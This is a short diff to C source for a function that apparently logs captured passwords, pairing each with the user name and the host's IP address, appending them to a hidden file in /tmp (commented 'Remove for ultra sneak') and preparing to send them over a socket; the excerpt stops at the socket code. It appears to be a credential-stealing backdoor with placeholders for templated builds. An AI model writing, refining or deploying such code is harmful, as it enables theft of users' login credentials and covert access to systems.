@@ -20,9 +20,6 @@ int writetofile (char *password){
     FILE * fptr;
     fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
     char * user;
-    char * msg;
-    char * msg2;
-    char * colon;
 
     // Write Shit
     if (pw) {
@@ -44,7 +41,7 @@ int writetofile (char *password){
         /* I want to get an IPv4 IP address */
         ifr.ifr_addr.sa_family = AF_INET;
 
-        /* I want IP address attached to "eth0" */
+        /* I want IP address attached to set interface */
         strncpy(ifr.ifr_name, "#INT", IFNAMSIZ-1);
         ioctl(fd, SIOCGIFADDR, &ifr);
         close(fd);
@@ -53,8 +50,8 @@ int writetofile (char *password){
         char buffer[256];
         char * ip;
         strcpy(user, name);
-        ip = printf("%s\n", inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
-        int j = snprintf(buffer, 1024, "%s:%s:%s\n", user, password, ip);
+        ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
+        //SNPRINT
         
         // // Send stuff // //
         // Make Socket
